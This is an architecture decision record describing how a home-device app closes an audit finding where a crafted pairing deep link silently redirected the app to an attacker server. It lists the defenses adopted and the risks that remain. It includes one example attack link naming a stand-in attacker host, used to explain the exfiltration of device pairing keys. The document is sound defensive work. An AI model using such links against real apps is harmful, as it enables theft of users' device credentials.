# ADR-HEARTH-160: Pair-link hardening (audit finding V1, HIGH)

Date: 2026-09-26. Status: accepted. Amends ADR-HEARTH-149 (household invite codes) and constrains ADR-HEARTH-131 (auto device sync).

## The attack

`hearth://pair?code=ABCD1234&server=https://evil.example` (sent by message, QR, NFC tag or web page) was redeemed with no confirmation:

1. `candidateServers` put the link's `server=` first; any 8-character code passed local validation.
2. An attacker server answering `{baseUrl, token}` with 200 passed `verifyReachable`.
3. `saveFamilyCommandCenterConfig` overwrote the stored base URL and token.
4. Auto device sync (ADR-HEARTH-131) then published every shared device, including LG/Samsung pairing keys, to the attacker, who could also inject device entries through the shared list. `http://` was accepted for any host.

## Decision (defense in depth)

1. **A link never joins.** `usePairLinkListener` only parses the link and hands it to `pendingPairInvite`; the Devices tab opens the Join screen prefilled (cold start takes the waiting invite on mount, warm start subscribes). A dialog names the host the phone will contact and, if a household is saved, says "This will replace your current household connection (host)". Nothing happens until the person taps Join/Replace.
2. **Server allowlist** (`src/discovery/trustedServers.ts`, suffixes in the single constant `TRUSTED_PUBLIC_SUFFIXES`). A link's `server=` is honored only if its host is a private-range address (10/8, 172.16/12, 192.168/16 as plain dotted decimals, or `*.local`), OR a proper subdomain of a trusted suffix (`.carddna.app`), OR the host of the saved config. Any non-private host requires https. Anything else is dropped and the saved/default candidates are used. The URL parser is strict: no userinfo, backslashes, IPv6 literals, trailing dots, leading-zero/hex/integer IPv4 forms, or ports above 65535.
3. **Redeem responses are validated** (`redeemResponse.ts`): body capped at 4096 chars, must be a JSON object, token a non-empty string of at most 512 chars, `baseUrl` must pass the same allowlist, `publicBaseUrl` must be https and on a trusted suffix or the saved host (a bare private address is not accepted as a public address). Failure throws `PairResponseRejectedError` and nothing is saved. `learnPublicUrlIfMissing` applies the same public-address rule.
4. **No silent replacement.** `joinHousehold` returns `{status: "would-replace", currentHost}` without any network call or write when a household is saved and `confirmedReplace` was not passed; the flag is passed only after the dialog is accepted.
5. **Sync host check.** A test proves `publishDevices` (and so `runAutoDeviceSync`) only sends to the saved config's LAN/public hosts, never any other.

## Decisions taken without asking (recorded per ADR-GLOBAL-002)

- Typed codes on the Join screen show the dialog only when replacing a saved household; link-originated joins always show it. Rationale: a typed code is already an explicit act; a link is not.
- A saved host that is a public non-carddna https host stays trusted (it is the user's own config); a saved http public host is not honored from links.
- Confirmation even for a link to the same server the phone already uses (a small extra tap; simpler and safer than special-casing).

## Residual risk

- Anyone on the same private network (or an attacker who can make a `.local` name resolve) can still host a server that passes the allowlist; the confirmation dialog naming the host is the only barrier there, and a person can still tap through it.
- A compromised `*.carddna.app` subdomain or the saved server itself is trusted by definition.
- Re-joining leaves a previously saved public address in place if the new redeem answer has none (pre-existing behavior of verify-and-save).
- Manual entry of an arbitrary address in Family Command Center settings is unchanged (an explicit typed act).
